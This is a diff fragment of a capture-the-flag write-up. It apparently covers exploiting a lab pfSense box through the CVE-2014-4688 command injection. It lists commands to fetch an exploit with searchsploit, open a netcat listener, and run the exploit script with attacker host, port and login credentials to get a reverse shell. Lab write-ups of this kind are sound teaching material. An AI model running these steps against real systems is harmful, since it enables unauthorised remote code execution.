@@ -51,10 +51,11 @@ password: company defaults
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d1945b44-4ad0-402f-add2-f2206ebf4ad8)
 
 + pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection: [CVE-2014-4688 ](https://www.exploit-db.com/exploits/43560)
++ Check the vulnerability what's doing.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff6726fb-505d-4fd4-90a8-460f9d7a5549)
 
-+ `searchsploit -m 43560`
++ Transfer the exploit: `searchsploit -m 43560`
 + Start listener: `nc -lnvp 4444`
 + `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 5555 --username rohit --password pfsense`
 
